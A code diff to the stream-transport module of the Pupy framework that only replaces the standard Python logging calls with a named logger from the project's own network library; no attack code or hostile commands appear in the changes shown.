@@ -3,7 +3,8 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 """ abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """
 
-import logging
+from network.lib import getLogger
+logger = getLogger('pss')
 
 __all__ = [
     'PupySocketStream',
@@ -15,7 +16,7 @@ try:
         'PupyUDPSocketStream'
     )
 except:
-    logging.warning('Datagram based stream is not available: KCP missing')
+    logger.warning('Datagram based stream is not available: KCP missing')
 
 import sys
 from rpyc.core import SocketStream, Connection, Channel
@@ -30,8 +31,6 @@ from rpyc.lib.compat import select, select_error, get_exc_errno, maxint
 from network.lib.buffer import Buffer
 
 import threading
-
-logger = logging.getLogger('pss')
 
 class addGetPeer(object):
     """ add some functions needed by some obfsproxy transports """
@@ -310,7 +309,7 @@ class PupySocketStream(SocketStream):
             raise
 
         except Exception as e:
-            logging.debug(traceback.format_exc())
+            logger.debug(traceback.format_exc())
             self.close()
             raise
 
@@ -344,7 +343,7 @@ class PupySocketStream(SocketStream):
             raise
 
         except Exception as e:
-            logging.debug(traceback.format_exc())
+            logger.debug(traceback.format_exc())
             self.close()
             raise
 
@@ -506,7 +505,7 @@ class PupyUDPSocketStream(object):
             return self.upstream.read(count)
 
         except Exception as e:
-            logging.debug(traceback.format_exc())
+            logger.debug(traceback.format_exc())
 
     def insert(self, data):
         with self.upstream_lock:
@@ -527,7 +526,7 @@ class PupyUDPSocketStream(object):
                     self.transport.upstream_recv(self.buf_out)
 
         except Exception as e:
-            logging.debug(traceback.format_exc())
+            logger.debug(traceback.format_exc())
 
     def consume(self):
         data = False
